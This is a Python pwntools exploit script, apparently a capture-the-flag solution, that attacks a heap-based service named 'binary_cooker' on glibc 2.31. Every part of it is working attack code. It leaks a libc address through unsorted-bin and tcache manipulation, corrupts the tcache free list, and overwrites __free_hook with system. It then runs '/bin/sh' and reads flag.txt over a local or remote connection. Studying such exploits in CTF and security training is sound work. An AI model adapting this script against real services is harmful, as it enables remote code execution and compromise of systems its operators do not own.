#!/usr/bin/env python3

from pwn import *
from pathlib import Path
import subprocess


exe = ELF("../src/binary_cooker")
libc = ELF("../src/libc-2.31.so")

context.binary = exe.path
context.terminal = ["tmux", "new-window"]


STACK_SIZE = 16
SIZEOF_SESSION = 8 * (3 + STACK_SIZE)

BUF_SIZE = SIZEOF_SESSION - 2


if len(sys.argv) == 3:
    try:
        address = sys.argv[1]
        port = int(sys.argv[2])
        args.REMOTE = True
    except:
        pass


s = None
def conn():
    global s
    if args.REMOTE:
        r = remote(address, port)
    else:
        if not s:
            s = process([exe.path], cwd="../src")
        r = remote("127.0.0.1", 1337)

    return r


def attach_gdb():
    proc_name = Path(exe.path).name
    pid = int(subprocess.check_output(f"pidof {proc_name} | awk '{{print $1}}'", shell=True).strip())

    if args.GDB:
        gdb.attach(
            pid,
            gdbscript=f"""
source ~/opt/pwndbg/gdbinit.py
file {exe.path}
b*handle_client+196
c
        """,
        )


def cmd(c: str, *args):
    r.sendlineafter(b"\n> ", c.encode())
    for arg in args:
        r.sendlineafter(b": ", arg)

    r.recvuntil(b"buf: ")
    buf = r.recvuntil(b"\n> ", drop=True)
    r.unrecv(b"\n> ")
    return buf


def get_leak():
    global r
    r = conn()

    r.sendlineafter(b"initial buffer: ", b"A")

    # alloc 7 buffers (#1 - #7)
    cmd("i", (b"A" * 7 + b",").ljust(BUF_SIZE, b"A"))
    for _ in range(6):
        cmd("p")

    # set the current buffer as buffer #7
    cmd("P")
    # set the strtok's internal pointer (olds) in buffer #7
    cmd("s")

    # free all the chunks
    # all the buffers end up in tcache, and the session is put in unsorted bin (as
    # the tcache 0xa0 has been filled by the buffers)
    cmd("r")

    # consume the unsorted chunk
    cmd("i", b"B" * 0x37)
    cmd("p")

    # alloc a new chunk after the new session to avoid it being consolidated with the top chunk
    cmd("p")

    # fill the 0xa0 tcache
    cmd("i", b"B" * BUF_SIZE)
    for _ in range(6):
        cmd("p")

    # leak unsorted->bk
    cmd("r")
    leak = cmd("n")
    leak = u64(leak.ljust(8, b"\x00"))

    libc.address = leak - 0x1ECBE0
    print(f"libc @ {hex(libc.address)}")

    r.close()


def main():
    global r
    r = conn()

    # alloc some 0x20 chunks
    r.sendlineafter(b"initial buffer: ", b"A")
    for _ in range(3):
        cmd("p")

    # alloc 7 chunks of size 0xa0 to fill tcache
    # when free'd, the first session will ends up unsorted
    # so the next session will be allocated from the tcache bin
    cmd("i", (b"B" * 0x8F + b",").ljust(BUF_SIZE, b"B"))
    for _ in range(6):
        cmd("p")

    cmd("P")
    cmd("s")

    cmd("r")

    # trigger the vuln
    cmd("n")
    # we now have s->buf = &s->stack_idx

    # update stack_idx
    # corrupt tcache 0x20 linked-list
    cmd("i", p64(-126, sign="signed") + b"\x01")

    cmd("P")

    target = libc.sym["__free_hook"] - 8
    cmd("i", p64(target))

    # overwrite __free_hook
    cmd("r")
    cmd("i", b"/bin/sh;" + p64(libc.sym["system"]))
    cmd("p")
    cmd("p")
    r.sendlineafter(b"\n> ", b"r")

    r.sendline(b"cat flag.txt")

    r.interactive()


if __name__ == "__main__":
    get_leak()
    main()

    s.close()
